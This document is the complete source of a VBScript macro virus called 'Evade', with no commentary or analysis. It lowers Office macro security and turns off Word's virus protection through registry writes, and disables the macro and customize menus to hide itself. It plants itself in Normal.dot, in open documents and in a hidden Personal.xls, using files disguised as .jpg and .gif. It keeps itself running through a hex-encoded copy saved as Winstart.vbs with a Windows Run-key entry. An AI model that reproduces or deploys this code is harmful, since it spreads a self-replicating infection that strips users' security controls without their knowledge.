On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
Set WinDir = fso.GetSpecialFolder(0)
Set SysDir = fso.GetSpecialFolder(1)
Set Wd = CreateObject("Word.Application")
If Wd <> "" Then
WdKey = "HKCU\Software\Microsoft\Office\" & Wd.Application.Version & "\Word\Security\"
wsc.RegWrite WdKey & "Level", 1, "REG_DWORD"
wsc.RegWrite WdKey & "AccessVBOM", 1, "REG_DWORD"
Wd.Options.VirusProtection = False
Wd.Options.SaveNormalPrompt = False
Wd.Options.ConfirmConversions = False
Set JC16 = fso.OpenTextFile(WScript.ScriptFullName, 1)
ScriptRead16 = JC16.ReadAll
JC16.Close
Set WM = fso.CreateTextFile(SysDir & "\Evade.jpg", True)
WM.WriteLine "Attribute VB_Name = ""Evade"""
WM.WriteLine "Sub AutoClose()"
WM.WriteLine "Call Evade"
WM.WriteLine "End Sub"
WM.WriteLine "Sub AutoOpen()"
WM.WriteLine "Call Evade"
WM.WriteLine "End Sub"
WM.WriteLine "Sub ViewVBCode()"
WM.WriteLine "End Sub"
WM.WriteLine "Sub Evade()"
WM.WriteLine "On Error Resume Next"
WM.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
WM.WriteLine "Set SysDir = fso.GetSpecialFolder(1)"
WM.WriteLine "Options.VirusProtection = 0: Options.SaveNormalPrompt = 0: Options.ConfirmConversions = 0"
WM.WriteLine "Application.DisplayStatusBar = 0: Application.ScreenUpdating = 0: Application.EnableCancelKey = wdCancelDisabled: Application.DisplayAlerts = wdAlertsNone"
WM.WriteLine "RegPath = ""HKEY_CURRENT_USER\Software\Microsoft\Office\"" & Application.Version & ""\Word\Security"""
WM.WriteLine "System.PrivateProfileString("""", RegPath, ""Level"") = 1&"
WM.WriteLine "System.PrivateProfileString("""", RegPath, ""AccessVBOM"") = 1&"
WM.WriteLine "CommandBars(""Tools"").Controls(""Macro"").Enabled = 0"
WM.WriteLine "CommandBars(""Macro"").Controls(""Security..."").Enabled = 0"
WM.WriteLine "CommandBars(""Macro"").Controls(""Macros..."").Enabled = 0"
WM.WriteLine "CommandBars(""Tools"").Controls(""Customize..."").Enabled = 0"
WM.WriteLine "CommandBars(""View"").Controls(""Toolbars"").Enabled = 0"
WM.WriteLine "CommandBars(""Format"").Controls(""Object..."").Enabled = 0"
WM.WriteLine "If ActiveDocument.VBProject.VBComponents.Item(""Evade"").Name = ""Evade"" Then ActiveDocument.VBProject.VBComponents.Item(""Evade"").Export SysDir & ""\Evade.jpg"""
WM.WriteLine "If Not NormalTemplate.VBProject.VBComponents.Item(""Evade"").Name = ""Evade"" Then NormalTemplate.VBProject.VBComponents.Import SysDir & ""\Evade.jpg"""
WM.WriteLine "If Not ActiveDocument.VBProject.VBComponents.Item(""Evade"").Name = ""Evade"" Then ActiveDocument.VBProject.VBComponents.Import SysDir & ""\Evade.jpg"""
WM.WriteLine "If InStr(1, ActiveDocument.Name, ""Document"") = 0 Then"
WM.WriteLine "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
WM.WriteLine "End If"
WM.WriteLine "If InStr(1, ActiveDocument.Name, ""Document"") = 1 Then ActiveDocument.Saved = 1"
WM.WriteLine "If Dir(SysDir & ""\Winstart.vbs"") <> ""Winstart.vbs"" Then"
WM.WriteLine "Tz16 = " & Chr(34) & Chr(34)
For i16 = 1 To Len(ScriptRead16)
Tz16 = Mid(ScriptRead16, i16, 1)
Tz16 = Hex(Asc(Tz16))
If Len(Tz16) = 1 Then
Tz16 = "0" & Tz16
End If
Gz16 = Gz16 + Tz16
If Len(Gz16) = 110 Then
WM.WriteLine "Tz16 = Tz16 + """ + Gz16 + Chr(34)
Gz16 = ""
End If
If Len(ScriptRead16) - i16 = 0 Then
WM.WriteLine "Tz16 = Tz16 + """ + Gz16 + Chr(34)
Gz16 = ""
End If
Next
WM.WriteLine "Open fso.GetSpecialFolder(1) & ""\Winstart.vbs"" For Output As 1"
WM.WriteLine "Print #1, CM16(Tz16)"
WM.WriteLine "Close 1"
WM.WriteLine "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"", ""Winstart"") = ""Wscript.exe "" & fso.GetSpecialFolder(1) & ""\Winstart.vbs %1"""
WM.WriteLine "End If"
WM.WriteLine "End Sub"
WM.WriteLine "Function CM16(CN16)"
WM.WriteLine "For GC16 = 1 To Len(CN16) Step 2"
WM.WriteLine "CM16 = CM16 & Chr(""&h"" & Mid(CN16, GC16, 2))"
WM.WriteLine "Next"
WM.WriteLine "End Function"
WM.Close
If fso.FileExists(SysDir & "\Evade.jpg") Then
If Wd.NormalTemplate.VBProject.VBComponents.Item("Evade").Name <> "Evade" Then
Wd.NormalTemplate.VBProject.VBComponents.Import SysDir & "\Evade.jpg"
Wd.NormalTemplate.VBProject.VBComponents.Item("Evade").Name = "Evade"
End If
End If
Wd.Quit
End If

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
Set WinDir = fso.GetSpecialFolder(0)
Set SysDir = fso.GetSpecialFolder(1)
Set Xl = CreateObject("Excel.Application")
If Xl <> "" Then
If fso.FileExists(Xl.Application.StartupPath & "\Personal.xls") Then
fso.DeleteFile (Xl.Application.StartupPath & "\Personal.xls")
End If
XlKey = "HKCU\Software\Microsoft\Office\" & Xl.Application.Version & "\Excel\Security\"
wsc.RegWrite XlKey & "Level", 1, "REG_DWORD"
wsc.RegWrite XlKey & "AccessVBOM", 1, "REG_DWORD"
Set JC = fso.OpenTextFile(WScript.ScriptFullName, 1)
ScriptRead = JC.ReadAll
JC.Close
Set EM = fso.CreateTextFile(SysDir & "\Evade.gif", True)
EM.WriteLine "Attribute VB_Name = ""Evade"""
EM.WriteLine "Sub Auto_Open()"
EM.WriteLine "Application.OnSheetActivate = ""osaEvade"""
EM.WriteLine "End Sub"
EM.WriteLine "Sub osaEvade()"
EM.WriteLine "On Error Resume Next"
EM.WriteLine "Application.ScreenUpdating = False"
EM.WriteLine "Application.DisplayAlerts = False"
EM.WriteLine "Application.EnableCancelKey = xlDisabled"
EM.WriteLine "Application.DisplayStatusBar = False"
EM.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
EM.WriteLine "Set wsc = CreateObject(""WScript.Shell"")"
EM.WriteLine "RegDword = ""REG_DWORD"""
EM.WriteLine "RegSecurity = ""HKEY_CURRENT_USER\Software\Microsoft\Office\"" & Application.Version"
EM.WriteLine "ExcelSecurity1 = RegSecurity & ""\Excel\Security\Level"""
EM.WriteLine "ExcelSecurity2 = RegSecurity & ""\Word\Security\AccessVBOM"""
EM.WriteLine "wsc.RegWrite ExcelSecurity1, 1, RegDword"
EM.WriteLine "wsc.RegWrite ExcelSecurity2, 1, RegDword"
EM.WriteLine "Application.VBE.ActiveVBProject.VBComponents(""Evade"").Export fso.GetSpecialFolder(1) & ""\Evade.gif"""
EM.WriteLine "If Dir(Application.StartupPath & ""\Personal.xls"") = ""Personal.xls"" Then"
EM.WriteLine "A1 = True"
EM.WriteLine "Else"
EM.WriteLine "A1 = False"
EM.WriteLine "End If"
EM.WriteLine "For A3 = 1 To ActiveWorkbook.VBProject.VBComponents.Count"
EM.WriteLine "If ActiveWorkbook.VBProject.VBComponents(A3).Name = ""Evade"" Then"
EM.WriteLine "A2 = True"
EM.WriteLine "End If"
EM.WriteLine "Next"
EM.WriteLine "If A2 = False Then"
EM.WriteLine "ActiveWorkbook.VBProject.VBComponents.Import fso.GetSpecialFolder(1) & ""\Evade.gif"""
EM.WriteLine "ActiveWorkbook.SaveAs Filename:=ActiveWorkbook.FullName"
EM.WriteLine "End If"
EM.WriteLine "If A1 = False Then"
EM.WriteLine "Workbooks.Add.SaveAs Filename:=Application.StartupPath & ""\Personal.xls"""
EM.WriteLine "ActiveWorkbook.VBProject.VBComponents.Import fso.GetSpecialFolder(1) & ""\Evade.gif"""
EM.WriteLine "ActiveWindow.Visible = False"
EM.WriteLine "Workbooks(""Personal.xls"").Save"
EM.WriteLine "End If"
EM.WriteLine "If Dir(fso.GetSpecialFolder(1) & ""\Winstart.vbs"") <> ""Winstart.vbs"" Then"
EM.WriteLine "Tz = " & Chr(34) & Chr(34)
For i = 1 To Len(ScriptRead)
Tz = Mid(ScriptRead, i, 1)
Tz = Hex(Asc(Tz))
If Len(Tz) = 1 Then
Tz = "0" & Tz
End If
Gz = Gz + Tz
If Len(Gz) = 110 Then
EM.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
If Len(ScriptRead) - i = 0 Then
EM.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
Next
EM.WriteLine "Open fso.GetSpecialFolder(1) & ""\Winstart.vbs"" For Output As 1"
EM.WriteLine "Print #1, CM(Tz)"
EM.WriteLine "Close 1"
EM.WriteLine "wsc.RegWrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Winstart"", ""Wscript.exe "" & fso.GetSpecialFolder(1) & ""\Winstart.vbs %1"""
EM.WriteLine "End If"
EM.WriteLine "End Sub"
EM.WriteLine "Function CM(CN)"
EM.WriteLine "For GC = 1 To Len(CN) Step 2"
EM.WriteLine "CM = CM & Chr(""&h"" & Mid(CN, GC, 2))"
EM.WriteLine "Next"
EM.WriteLine "End Function"
EM.Close
Xl.Visible = False
Xl.WorkBooks.Add
Xl.ActiveWorkbook.VBProject.VBComponents.Import (fso.GetSpecialFolder(1) & "\Evade.gif")
Xl.ActiveWorkbook.SaveAs (Xl.Application.StartupPath & "\Personal.xls")
Xl.Quit
End If
